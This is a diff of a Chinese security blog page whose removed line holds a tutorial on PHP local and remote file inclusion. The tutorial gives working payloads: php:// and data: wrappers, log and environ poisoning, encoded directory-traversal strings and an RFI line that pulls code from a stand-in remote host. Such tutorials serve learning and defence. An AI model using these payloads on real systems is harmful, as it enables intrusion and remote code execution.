@@ -1,4 +1,1268 @@
-<!DOCTYPE html><html class="theme-next mist use-motion" lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script><link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet"><style>.pace .pace-progress{background:#000;height:2px}.pace .pace-progress-inner{box-shadow:0 0 10px #1e92fb,0 0 5px #1e92fb}.pace .pace-activity{border-top-color:#1e92fb;border-left-color:#1e92fb}</style><meta name="theme-color" content="#222"><script></script><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css"><link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0"><link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0"><link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222"><script type="text/javascript" id="hexo.configurations">var NexT=window.NexT||{},CONFIG={root:"/",scheme:"Mist",version:"6.3.0",sidebar:{position:"left",display:"post",offset:12,b2t:!1,scrollpercent:!1,onmobile:!1},fancybox:!1,fastclick:!1,lazyload:!1,tabs:!0,motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},algolia:{applicationID:"",apiKey:"",indexName:"",hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}}}</script><meta name="description" content="0x01 文件包含函数 include() include_once() require() require_once()"><meta name="keywords" content="Web安全,PHP,文件包含"><meta property="og:type" content="article"><meta property="og:title" content="PHP文件包含漏洞"><meta property="og:url" content="https://pino-hd.github.io/2018/05/30/PHP文件包含漏洞/index.html"><meta property="og:site_name" content="Pin0&#39;s Blog"><meta property="og:description" content="0x01 文件包含函数 include() include_once() require() require_once()"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞1.png"><meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞2.png"><meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞3.png"><meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞4.png"><meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞5.png"><meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞6.png"><meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞7.png"><meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞8.png"><meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞9.png"><meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞10.png"><meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞11.png"><meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞12.png"><meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞13.png"><meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞14.png"><meta property="og:updated_time" content="2018-05-30T14:43:21.928Z"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="PHP文件包含漏洞"><meta name="twitter:description" content="0x01 文件包含函数 include() include_once() require() require_once()"><meta name="twitter:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞1.png"><link rel="canonical" href="https://pino-hd.github.io/2018/05/30/PHP文件包含漏洞/"><script type="text/javascript" id="page.configurations">CONFIG.page={sidebar:""}</script><title>PHP文件包含漏洞 | Pin0's Blog</title><noscript><style type="text/css">.sidebar-inner,.use-motion .brand,.use-motion .collection-title,.use-motion .comments,.use-motion .menu-item,.use-motion .motion-element,.use-motion .pagination,.use-motion .post-block,.use-motion .post-body,.use-motion .post-header{opacity:initial}.use-motion .logo,.use-motion .site-subtitle,.use-motion .site-title{opacity:initial;top:initial}.logo-line-after i{right:initial}</style></noscript></head><body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN"><div class="container sidebar-position-left page-post-detail"><div class="headband"></div><header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-wrapper"><div class="site-meta"><div class="custom-logo-site-title"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">Pin0's Blog</span><span class="logo-line-after"><i></i></span></a></div></div><div class="site-nav-toggle"> <button aria-label="切换导航栏"><span class="btn-bar"></span><span class="btn-bar"></span><span class="btn-bar"></span></button></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i><br>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i><br>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i><br>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i><br>分类</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i><br>关于</a></li><li class="menu-item menu-item-search"><a href="javascript:;" class="popup-trigger"><i class="menu-item-icon fa fa-search fa-fw"></i><br>搜索</a></li></ul><div class="site-search"><div class="popup search-popup local-search-popup"><div class="local-search-header clearfix"><span class="search-icon"><i class="fa fa-search"></i></span><span class="popup-btn-close"><i class="fa fa-times-circle"></i></span><div class="local-search-input-wrapper"> <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input"></div></div><div id="local-search-result"></div></div></div></nav></div></header><main id="main" class="main"><div class="main-inner"><div class="content-wrap"><div id="content" class="content"><div id="posts" class="posts-expand"><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="https://pino-hd.github.io/2018/05/30/PHP文件包含漏洞/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Pino-HD"><meta itemprop="description" content=""><meta itemprop="image" content="/images/avatar.jpg"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Pin0's Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">PHP文件包含漏洞</h1><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建时间：2018-05-30 22:39:58 / 修改时间：22:43:21" itemprop="dateCreated datePublished" datetime="2018-05-30T22:39:58+08:00">2018-05-30</time></span> <span class="post-category"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-folder-o"></i></span> <span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/Web安全/" itemprop="url" rel="index"><span itemprop="name">Web安全</span></a></span></span> <span id="/2018/05/30/PHP文件包含漏洞/" class="leancloud_visitors" data-flag-title="PHP文件包含漏洞"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-eye"></i></span> <span class="post-meta-item-text">热度：</span><span class="leancloud-visitors-count"></span> <span>℃</span></span><div class="post-symbolscount"><span class="post-meta-item-icon"><i class="fa fa-file-word-o"></i></span> <span class="post-meta-item-text">本文字数：</span> <span title="本文字数">3k</span> <span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-clock-o"></i></span> <span class="post-meta-item-text">阅读时长 &asymp;</span> <span title="阅读时长">5 分钟</span></div></div></header><div class="post-body" itemprop="articleBody"><h2 id="0x01-文件包含函数"><a href="#0x01-文件包含函数" class="headerlink" title="0x01 文件包含函数"></a>0x01 文件包含函数</h2><ul><li>include()</li><li>include_once()</li><li>require()</li><li>require_once()<a id="more"></a> 这里include()函数如果在包含的过程中发生错误，会发出警告，但是会继续执行后续代码；<br>require()函数如果在包含的过程中发生错误，会报错退出，并且不再执行之后的代码。<br>include_once()和require_once()的功能跟include()和require()类似，只不过前者如果已经包含了文件，那么就不会包含第二次，以免出现函数重定义或变量重赋值的问题。</li></ul><p>以上四个函数不管包含的文件类型是什么，都会当作php文件进行解析，例如<br>phpinfo.txt<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">phpinfo();</span><br></pre></td></tr></table></figure><p></p><p>lfi.php<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$temp=$_GET[&apos;c&apos;];</span><br><span class="line">include($temp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p></p><p><img src="/images/PHP文件包含漏洞1.png" alt=""></p><p>成功执行phpinfo()！</p><h2 id="0x02-文件包含分类"><a href="#0x02-文件包含分类" class="headerlink" title="0x02 文件包含分类"></a>0x02 文件包含分类</h2><p><strong>1. LFI（本地文件包含）</strong></p><p>本地文件包含就是包含服务器本地的文件。</p><p><strong>2. RFI（远程文件包含）</strong></p><p>远程文件包含就是包含远程服务器上的文件，这样我们就可以自定义自己想要执行的代码，因此危害比较大。远程文件包含需要一定的条件<br>php.ini配置<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen=On（默认开启）</span><br><span class="line">allow_url_include=On（默认关闭）</span><br></pre></td></tr></table></figure><p></p><h2 id="0x03-php伪协议"><a href="#0x03-php伪协议" class="headerlink" title="0x03 php伪协议"></a>0x03 php伪协议</h2><p>假设服务器lfi.php内容如下<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$temp = $_GET[&apos;c&apos;];</span><br><span class="line">include($temp);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p></p><p><strong>php://input</strong></p><p>使用条件<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include=On（默认关闭）</span><br><span class="line">allow_url_fopen不做要求（默认开启）</span><br></pre></td></tr></table></figure><p></p><p><img src="/images/PHP文件包含漏洞2.png" alt=""></p><p><img src="/images/PHP文件包含漏洞3.png" alt=""></p><p><strong>php://filter</strong></p><p>使用条件：无</p><p>··<br>？c=php://filter/read=convert.base64-encode/resource=xxx<br>或者<br>?c=php://filter/convert.base64-encode/resource=xxx<br>···<br>通过指定resource的值来读取文件，读取的文件是base64加密后的，读取到后解一下就好了。</p><p><img src="/images/PHP文件包含漏洞4.png" alt=""></p><p><strong>phar://*</strong></p><p>使用条件：php版本大于等于5.3.0</p><p>假设需要读取的文件是phpinfo.txt，将其压缩成zip文件（phpinfo.zip）</p><p><img src="/images/PHP文件包含漏洞5.png" alt=""></p><p>然后指定文件的绝对路径<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=phar://C://wamp64/www/phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure><p></p><p><img src="/images/PHP文件包含漏洞6.png" alt=""></p><p>或者使用相对路径（这里phpinfo.zip就在当前路径）<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=phar://phpinfo.zip/phpinfo.txt</span><br></pre></td></tr></table></figure><p></p><p><img src="/images/PHP文件包含漏洞7.png" alt=""></p><p><strong>zip://</strong></p><p>使用条件：php版本大于等于5.3.0</p><p>zip://与phar://的使用类似，但是需要绝对路径， zip文件后面要跟%23加zip文件里的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=zip://C:/wamp64/www/phpinfo.zip%23phpinfo.txt</span><br></pre></td></tr></table></figure><p><img src="/images/PHP文件包含漏洞8.png" alt=""></p><p><strong>data:URL schema</strong></p><p>使用条件：<br>php版本大于等于5.2.0<br>allow_url_include=On(默认关闭)<br>allow_url_fopen=On(默认开启)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/PHP文件包含漏洞9.png" alt=""></p><p>或者<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br></pre></td></tr></table></figure><p></p><p><img src="/images/PHP文件包含漏洞10.png" alt=""></p><p><strong>session文件包含</strong></p><p>使用条件：session文件路径已知，并且内容部分可控</p><p>session文件路径可以在phpinfo中session.save_path得到</p><p><img src="/images/PHP文件包含漏洞11.png" alt=""></p><p>一般情况下session文件都在/tmp目录下<br>命名格式：sess_[phpsessid]，而phpsessid可以在cookie中得到</p><p>要包含并利用的话，需要能控制部分sesssion文件的内容。暂时没有通用的办法。有些时候，可以先包含进session文件，观察里面的内容，然后根据里面的字段来发现可控的变量，从而利用变量来写入payload，并之后再次包含从而执行php代码。</p><p><strong>包含日志文件</strong></p><p>使用条件： 需要知道日志文件的目录，并且日志文件可读</p><p>当我们访问服务器的时候，访问的请求会被记录到access.log，当发生错误的时候会把错误写入到error.log，一般日志的路径linux下是/var/logs/apache2，windows下wamp在/wamp/logs<br>但是如果我们直接请求的话，一些特殊字符会被url编码从而导致包含后无法解析</p><p><img src="/images/PHP文件包含漏洞12.png" alt=""></p><p>可以用burp抓包后改包即可。</p><p><img src="/images/PHP文件包含漏洞13.png" alt=""></p><p>之后就可以包含进行利用啦</p><p><img src="/images/PHP文件包含漏洞14.png" alt=""></p><p><strong>包含ssh-log</strong></p><p>使用条件：ssh日志路径已知，并且可读，默认情况下在/var/log/auth.log</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &apos;&lt;?php phpinfo(); ?&gt;&apos;@remotehost</span><br></pre></td></tr></table></figure><p>之后密码随便写<br>之后包含日志文件就好啦</p><p><strong>environ</strong></p><p>使用条件：</p><ol><li>php以cgi方式运行，这样environ才会保持UA头。</li><li>environ文件存储位置已知，且environ文件可读。</li></ol><p>proc/self/environ中会保存user-agent头。如果在user-agent中插入php代码，则php代码会被写入到environ中。之后再包含它，即可。</p><p><strong>条件竞争</strong></p><h2 id="0x04-绕过姿势"><a href="#0x04-绕过姿势" class="headerlink" title="0x04 绕过姿势"></a>0x04 绕过姿势</h2><h4 id="指定前缀"><a href="#指定前缀" class="headerlink" title="指定前缀"></a>指定前缀</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&apos;file&apos;];</span><br><span class="line">include &apos;/var/www/html/&apos;.$file;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>目录遍历</strong></p><p>可以用../进行目录遍历，访问其他目录的文件</p><p><strong>编码</strong></p><p>但有的时候，服务器通常会把../过滤掉，这个时候可以用编码进行绕过<br>利用url编码<br>%2e%2e%5c<br>..%5c<br>%2e%2e\<br>%2e%2e%2f<br>..%2f<br>%2e%2e/<br>../<br>..\</p><p>二次编码<br>%252e%252e%255c<br>%252e%252e%252f<br>../<br>..\</p><p>容器/服务器的编码方式<br>../<br>..%c0%af<br>%c0%ae%c0%ae/<br>注：<a href="https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work" target="_blank" rel="noopener">Why does Directory traversal attack %C0%AF work?</a></p><p>%c0%ae%c0%ae/<br>注：java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点）<br>Apache Tomcat Directory Traversal<br>..\<br>..%c1%9c</p><h4 id="指定后缀"><a href="#指定后缀" class="headerlink" title="指定后缀"></a>指定后缀</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$file = $_GET[&apos;file&apos;];</span><br><span class="line">include $file.&apos;/test/test.php&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>?问号绕过</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=http://remoteaddr/remoteinfo.txt?</span><br></pre></td></tr></table></figure><p></p><p>问号后面的部分/test/test.php，也就是指定的后缀被当作query从而被绕过。注意需要把#进行url编码为%23。</p><p><strong>利用zip协议</strong></p><p>可以构造跟后缀一样的路径，再打包成zip文件，然后利用zip协议包含即可</p></div><div><div class="my_post_copyright"><script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script><script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script><script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script><link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css"><p><span>本文标题:</span><a href="/2018/05/30/PHP文件包含漏洞/">PHP文件包含漏洞</a></p><p><span>文章作者:</span><a href="/" title="访问 Pino-HD 的个人博客">Pino-HD</a></p><p><span>发布时间:</span>2018年05月30日 - 22:05</p><p><span>最后更新:</span>2018年05月30日 - 22:05</p><p><span>原始链接:</span><a href="/2018/05/30/PHP文件包含漏洞/" title="PHP文件包含漏洞">https://pino-hd.github.io/2018/05/30/PHP文件包含漏洞/</a><span class="copy-path" title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="https://pino-hd.github.io/2018/05/30/PHP文件包含漏洞/" aria-label="复制成功！"></i></span></p><p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p></div><script>var clipboard=new Clipboard(".fa-clipboard");clipboard.on("success",$(function(){$(".fa-clipboard").click(function(){swal({title:"",text:"复制成功",html:!1,timer:500,showConfirmButton:!1})})}))</script></div><div><div style="padding:10px 0;margin:20px auto;width:90%;text-align:center"><div>坚持原创技术分享，您的支持将鼓励我继续创作！</div> <button id="rewardButton" disable="enable" onclick='var qr=document.getElementById("QR");"none"===qr.style.display?qr.style.display="block":qr.style.display="none"'> <span>打赏</span></button><div id="QR" style="display:none"><div id="wechat" style="display:inline-block"> <img id="wechat_qr" src="/images/wechat.jpg" alt="Pino-HD 微信支付"><p>微信支付</p></div><div id="alipay" style="display:inline-block"> <img id="alipay_qr" src="/images/alipay.jpg" alt="Pino-HD 支付宝"><p>支付宝</p></div></div></div></div><footer class="post-footer"><div class="post-tags"><a href="/tags/Web安全/" rel="tag"><i class="fa fa-tag"></i> Web安全</a><a href="/tags/PHP/" rel="tag"><i class="fa fa-tag"></i> PHP</a><a href="/tags/文件包含/" rel="tag"><i class="fa fa-tag"></i> 文件包含</a></div><div class="post-nav"><div class="post-nav-next post-nav-item"><a href="/2018/05/30/XSS防御说/" rel="next" title="XSS防御说"><i class="fa fa-chevron-left"></i> XSS防御说</a></div><span class="post-nav-divider"></span><div class="post-nav-prev post-nav-item"> <a href="/2018/05/30/PHP文件上传漏洞/" rel="prev" title="PHP文件上传漏洞">PHP文件上传漏洞<i class="fa fa-chevron-right"></i></a></div></div></footer></div></article><div class="post-spread"></div></div></div></div><div class="sidebar-toggle"><div class="sidebar-toggle-line-wrap"><span class="sidebar-toggle-line sidebar-toggle-line-first"></span><span class="sidebar-toggle-line sidebar-toggle-line-middle"></span><span class="sidebar-toggle-line sidebar-toggle-line-last"></span></div></div><aside id="sidebar" class="sidebar"><div class="sidebar-inner"><ul class="sidebar-nav motion-element"><li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap"> 文章目录</li><li class="sidebar-nav-overview" data-target="site-overview-wrap"> 站点概览</li></ul><section class="site-overview-wrap sidebar-panel"><div class="site-overview"><div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person"> <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Pino-HD"><p class="site-author-name" itemprop="name">Pino-HD</p><p class="site-description motion-element" itemprop="description"></p></div><nav class="site-state motion-element"><div class="site-state-item site-state-posts"> <a href="/archives/"><span class="site-state-item-count">111</span> <span class="site-state-item-name">日志</span></a></div><div class="site-state-item site-state-categories"> <a href="/categories/index.html"><span class="site-state-item-count">14</span> <span class="site-state-item-name">分类</span></a></div><div class="site-state-item site-state-tags"> <a href="/tags/index.html"><span class="site-state-item-count">71</span> <span class="site-state-item-name">标签</span></a></div></nav><div class="links-of-author motion-element"><span class="links-of-author-item"><a href="https://github.com/Pino-HD" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i> GitHub</a></span><span class="links-of-author-item"><a href="https://www.jianshu.com/u/256045bfc368" target="_blank" title="简书"><i class="fa fa-fw fa-heartbeat"></i> 简书</a></span><span class="links-of-author-item"><a href="https://weibo.com/u/2925327381/home?wvr=5" target="_blank" title="Weibo"><i class="fa fa-fw fa-weibo"></i> Weibo</a></span></div><div class="links-of-blogroll motion-element links-of-blogroll-inline"><div class="links-of-blogroll-title"><i class="fa fa-fw fa-link"></i> Links</div><ul class="links-of-blogroll-list"><li class="links-of-blogroll-item"> <a href="http://example.com/" title="Title" target="_blank">Title</a></li></ul></div></div></section><section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active"><div class="post-toc"><div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-文件包含函数"><span class="nav-number">1.</span> <span class="nav-text">0x01 文件包含函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-文件包含分类"><span class="nav-number">2.</span> <span class="nav-text">0x02 文件包含分类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-php伪协议"><span class="nav-number">3.</span> <span class="nav-text">0x03 php伪协议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-绕过姿势"><span class="nav-number">4.</span> <span class="nav-text">0x04 绕过姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#指定前缀"><span class="nav-number">4.0.1.</span> <span class="nav-text">指定前缀</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#指定后缀"><span class="nav-number">4.0.2.</span> <span class="nav-text">指定后缀</span></a></li></ol></li></ol></div></div></section></div></aside></div></main><footer id="footer" class="footer"><div class="footer-inner"><script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="copyright">&copy; <span itemprop="copyrightYear">2018</span><span class="with-love" id="animate"><i class="fa fa-user"></i></span> <span class="author" itemprop="copyrightHolder">Pino-HD</span> <span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-area-chart"></i></span> <span class="post-meta-item-icon">站点总字数</span> <span title="站点总字数">163k</span> <span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-coffee"></i></span> <span class="post-meta-item-icon">站点阅读时长</span> <span title="站点阅读时长">4:false</span> <span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-user-md"></i></span> <span id="busuanzi_container_site_uv">本站访客数</span><span id="busuanzi_value_site_uv"></span></div></div></footer><div class="back-to-top"><i class="fa fa-arrow-up"></i></div></div><script type="text/javascript">"[object Function]"!==Object.prototype.toString.call(window.Promise)&&(window.Promise=null)</script><script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script><script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script><script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script><script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script><script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script><script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script><script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script><script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script><script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script><script type="text/javascript">
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #000000; /*进度条颜色*/
+        height: 2px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+<meta name="theme-color" content="#222">
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '6.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="0x01 文件包含函数 include() include_once() require() require_once()">
+<meta name="keywords" content="Web安全,PHP,文件包含">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP文件包含漏洞">
+<meta property="og:url" content="https://pino-hd.github.io/2018/05/30/PHP文件包含漏洞/index.html">
+<meta property="og:site_name" content="Pin0&#39;s Blog">
+<meta property="og:description" content="0x01 文件包含函数 include() include_once() require() require_once()">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞1.png">
+<meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞2.png">
+<meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞3.png">
+<meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞4.png">
+<meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞5.png">
+<meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞6.png">
+<meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞7.png">
+<meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞8.png">
+<meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞9.png">
+<meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞10.png">
+<meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞11.png">
+<meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞12.png">
+<meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞13.png">
+<meta property="og:image" content="https://pino-hd.github.io/images/PHP文件包含漏洞14.png">
+<meta property="og:updated_time" content="2018-05-30T14:43:21.928Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="PHP文件包含漏洞">
+<meta name="twitter:description" content="0x01 文件包含函数 include() include_once() require() require_once()">
